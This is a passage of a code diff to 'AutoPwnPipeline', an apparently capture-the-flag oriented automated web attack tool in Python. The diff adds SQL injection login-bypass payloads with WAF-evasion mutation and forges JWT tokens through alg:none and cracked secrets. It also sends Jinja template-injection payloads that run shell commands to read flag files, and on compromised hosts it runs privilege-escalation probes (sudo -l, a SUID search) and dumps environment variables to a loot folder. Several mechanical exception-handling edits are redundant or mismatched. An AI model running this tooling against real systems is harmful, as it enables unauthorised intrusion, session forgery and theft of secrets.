+                        auth_payloads.append(f"admin' AND password='{sec}'-- -")
+
                 for p in auth_payloads:
                     data = {name: p for name in inputs}
                     try:
@@ -2058,7 +2952,15 @@ class AutoPwnPipeline:
                             
                         # Cognitive response analysis for SQL errors
                         diag = ResponseAnalyzer.analyze_response(r.text, r.status_code, dict(r.headers), probe_sent=p)
-                        if diag["db_errors"] or diag["waf_detected"]:
+                        
+                        if diag["waf_detected"]:
+                            print_warning(f"WAF detected for SQLi payload '{p}'. Engaging BypassEngine...")
+                            mutated = BypassEngine.mutate_sqli(p, level=3)
+                            for m in mutated:
+                                if m["payload"] not in auth_payloads:
+                                    auth_payloads.append(m["payload"])
+                                    
+                        if diag["db_errors"]:
                             summary = ResponseAnalyzer.format_diagnostic_summary(diag)
                             if summary:
                                 console.print(summary)
@@ -2070,7 +2972,8 @@ class AutoPwnPipeline:
                             self._log_step("Phase 4: Exploitation", f"SQLi Auth Bypass on {action}", curl_cmd=f"curl -X {method} {action} -d '{inputs[0]}={p}'")
                             self.learning_engine.record_success(self.target_url, self.state["tech_stack"], "sqli", "auth_bypass", p, list(self.state["captured_flags"]))
                             break
-                    except Exception:
+                    except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                        pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                         pass
 
     def _exploit_jwt(self):
@@ -2085,11 +2988,15 @@ class AutoPwnPipeline:
                     print_success(f"JWT Alg:None Bypass Succeeded on cookie '{cname}'!")
                     self.session.cookies.set(cname, none_token)
                     self._log_step("Phase 4: Exploitation", "JWT alg:none forged admin token")
-            except Exception:
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                 pass
 
-            # 2. Test weak secret brute force
+            # 2. Test weak secret brute force and leaked secrets
             cracked = bruteforce_secret(token)
+            if not cracked:
+                cracked = self.state.get("leaked_secrets", {}).get("secret_key")
+            
             if cracked:
                 print_success(f"JWT Secret Key Cracked: [bold green]{cracked}[/bold green]")
                 self.state["leaked_secrets"]["jwt_secret"] = cracked
@@ -2105,7 +3012,7 @@ class AutoPwnPipeline:
                         print_success(f"JWT Cracked Bypass Succeeded on cookie '{cname}'!")
                         self.session.cookies.set(cname, forged)
                         self._log_step("Phase 4: Exploitation", "JWT cracked secret forged admin token")
-                except Exception as e:
+                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                     print_error(f"Failed to forge and use cracked JWT: {e}")
 
     def _exploit_cbc_bitflip(self):
@@ -2131,7 +3038,8 @@ class AutoPwnPipeline:
             # Try to decode base64 once - if it fails, skip
             try:
                 decoded = b64decode(cval)
-            except Exception:
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                 continue
 
             # Check if decoded data looks like encrypted JSON (not plaintext)
@@ -2144,7 +3052,8 @@ class AutoPwnPipeline:
                 plain = decoded.decode("utf-8")
                 if "{" in plain and "}" in plain:
                     continue  # Already plaintext, not encrypted
-            except Exception:
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                 pass  # Binary data - likely encrypted, good candidate
 
             # Check for common JSON markers in the decrypted content
@@ -2196,7 +3105,8 @@ class AutoPwnPipeline:
                                 )
                                 found = True
                                 break
-                    except Exception:
+                    except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                        pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                         continue
                 if found:
                     break
@@ -2218,7 +3128,8 @@ class AutoPwnPipeline:
                     script_name = s_url.split("/")[-1] or "external.js"
                     self.state["leaked_source_files"][script_name] = r_js.text
                     scripts_to_analyze.append((script_name, r_js.text, s_url))
-            except Exception:
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                 pass
         
         for idx, inl_js in enumerate(self.state.get("inline_scripts", [])):
@@ -2274,7 +3185,8 @@ class AutoPwnPipeline:
                             else:
                                 r_sub = self.session.get(action_url, params=form_data, timeout=15)
                             self._check_and_store_flags(r_sub.text, f"Authenticated Form Submission ({action_url})")
-                        except Exception:
+                        except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                            pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                             pass
 
             # Check deobfuscated strings
@@ -2341,7 +3253,8 @@ class AutoPwnPipeline:
                                             decoded_text = d.data.decode("utf-8", errors="ignore")
                                             print_info(f"QR Code Decoded Content: [bold cyan]{decoded_text}[/bold cyan]")
                                             self._check_and_store_flags(decoded_text, "Reconstructed QR Code")
-                                    except Exception:
+                                    except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                                        pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                                         pass
                                     
                                     # Extract strings from PNG data
@@ -2353,9 +3266,11 @@ class AutoPwnPipeline:
                                             self.target_url, self.state["tech_stack"], "client_crypto", "png_scrambler", key_str, list(self.state["captured_flags"])
                                         )
                                         return
-                                except Exception:
+                                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                                     pass
-            except Exception:
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                 pass
 
 
@@ -2470,7 +3385,8 @@ class AutoPwnPipeline:
                     r = self.session.get(action_url, params=data, timeout=6)
                 blocked = any(k in r.text.lower() for k in ["hacker detected", "forbidden", "blocked", "invalid input", "attack detected"])
                 return r.text, blocked
-            except Exception:
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                 return "", True
 
         # --- 6. Iterate payloads, escalating ------------------------------------------------
@@ -2502,7 +3418,8 @@ class AutoPwnPipeline:
                     if r.status_code == 405 or "method" in r.text.lower():
                         r2 = self.session.post(rep, data={"url": self.target_url, "link": self.target_url}, timeout=6)
                         self._check_and_store_flags(r2.text, f"Admin Bot POST ({rep})")
-                except Exception:
+                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                     pass
 
         # --- 8. Record learning --------------------------------------------------------------
@@ -2594,7 +3511,8 @@ class AutoPwnPipeline:
                     "find / -name '*flag*' -exec cat {} + 2>/dev/null"
                 )
                 self._check_and_store_flags(out, "Chained RCE flag hunt")
-            except Exception:
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                 pass
 
         # ── 2. If we have leaked secrets, chain into session forgery ────
@@ -2619,9 +3537,11 @@ class AutoPwnPipeline:
                                     params={p: "{{ lipsum.__globals__['os'].popen('cat /flag* || cat /root/*flag*').read() }}"},
                                     cookies={"session": forged}, timeout=15)
                                 self._check_and_store_flags(ssti_resp.text, f"Chained admin SSTI ({p})")
-                    except Exception:
+                    except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                        pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                         pass
-            except Exception:
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                 pass
 
         # ── 3. If admin is accessible, chain into admin-only flag hunting ──
@@ -2631,7 +3551,8 @@ class AutoPwnPipeline:
                 try:
                     r = self.session.get(urljoin(self.target_url, path), timeout=15)
                     self._check_and_store_flags(r.text, f"Chained admin flag ({path})")
-                except Exception:
+                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                     pass
 
         # ── 4. If XSS payload was submitted, chain into admin bot exploitation ──
@@ -2678,7 +3599,8 @@ class AutoPwnPipeline:
                         script_code = VulnerabilityChainEngine.generate_python_exploit_script(ch)
                         LootManager.save_loot_file(self.target_url, f"exploit_chain_{ch['source_file']}.py", script_code)
                         print_success(f"Reproducible Exploit Script saved to loot: exploit_chain_{ch['source_file']}.py")
-                    except Exception:
+                    except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                        pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                         pass
 
         # 2. Web PrivEsc: Check Leaked Source Code for Secret Keys & Forge Tokens
@@ -2702,7 +3624,8 @@ class AutoPwnPipeline:
                             for admin_param in admin_parsed["parameters"]:
                                 ssti_resp = self.session.get(admin_url, params={admin_param: "{{ lipsum.__globals__['os'].popen('cat /flag* || cat /root/*flag*').read() }}"}, cookies={"session": forged_admin}, timeout=15)
                                 self._check_and_store_flags(ssti_resp.text, f"Admin SSTI ({admin_param})")
-                    except Exception:
+                    except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                        pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                         pass
 
         # 3. System PrivEsc: If RCE is active, inspect system privileges
@@ -2712,7 +3635,8 @@ class AutoPwnPipeline:
                 id_out = self.state["active_rce_method"]("id; whoami; sudo -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null")
                 print_info(f"Current System Context: {id_out.strip().splitlines()[0] if id_out else 'Unknown'}")
                 self._check_and_store_flags(id_out, "System PrivEsc Probe Output")
-            except Exception:
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                 pass
 
     # =========================================================================
@@ -2750,7 +3674,9 @@ class AutoPwnPipeline:
                     for s in findings["suid_exploits"][:3]:
                         print_info(f"  Binary: [bold cyan]{s['binary']}[/bold cyan] -> Exploit: {s['exploit']}")
 
-            except Exception:
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+
+                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                 pass
 
         # 2. Audit all leaked source files for sinks
@@ -2767,7 +3693,8 @@ class AutoPwnPipeline:
                 env_out = self.state["active_rce_method"]("env")
                 self._check_and_store_flags(env_out, "Environment Variables")
                 LootManager.save_loot_file(self.target_url, "environment_dump.txt", env_out)
-            except Exception:
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                 pass
 
     # =========================================================================
@@ -2793,7 +3720,8 @@ class AutoPwnPipeline:
                 try:
                     out = self.state["active_rce_method"](cmd)
                     self._check_and_store_flags(out, f"Command: {cmd}")
-                except Exception:
+                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                     pass
 
         # 2. Display Final Flags Summary
